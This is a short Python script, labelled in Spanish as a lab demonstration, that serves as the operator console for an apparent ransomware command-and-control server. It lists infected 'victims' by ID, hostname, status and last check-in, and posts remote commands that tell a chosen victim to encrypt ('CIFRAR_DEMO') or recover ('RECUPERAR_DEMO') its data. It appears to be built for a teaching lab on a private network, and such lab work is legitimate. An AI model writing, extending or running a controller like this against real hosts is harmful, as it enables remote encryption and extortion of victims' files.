from __future__ import annotations

import argparse
import requests


def main() -> None:
    parser = argparse.ArgumentParser(description="Controlador V4 de demostracion")
    parser.add_argument("--server", default="http://192.168.100.10:5000")
    args = parser.parse_args()
    server = args.server.rstrip("/")
    while True:
        print("\n=== CONTROLADOR LAB V4 ===")
        print("1. Actualizar/listar")
        print("2. CIFRAR_DEMO remotamente")
        print("3. RECUPERAR_DEMO remotamente")
        print("4. Ver estado")
        print("5. Salir")
        option = input("Opcion: ").strip()
        try:
            if option == "1":
                for victim_id, victim in requests.get(server + "/estado", timeout=5).json().items():
                    print(victim_id, "|", victim.get("hostname"), "|", victim.get("estado"), "|", victim.get("ultima_conexion"))
            elif option in {"2", "3"}:
                victim_id = input("ID de victima: ").strip().upper()
                command = "CIFRAR_DEMO" if option == "2" else "RECUPERAR_DEMO"
                print(requests.post(server + "/ordenar", json={"id": victim_id, "comando": command}, timeout=5).json())
            elif option == "4":
                print(requests.get(server + "/estado", timeout=5).json())
            elif option == "5":
                return
        except requests.RequestException as error:
            print("Servidor no disponible:", error)


if __name__ == "__main__":
    main()
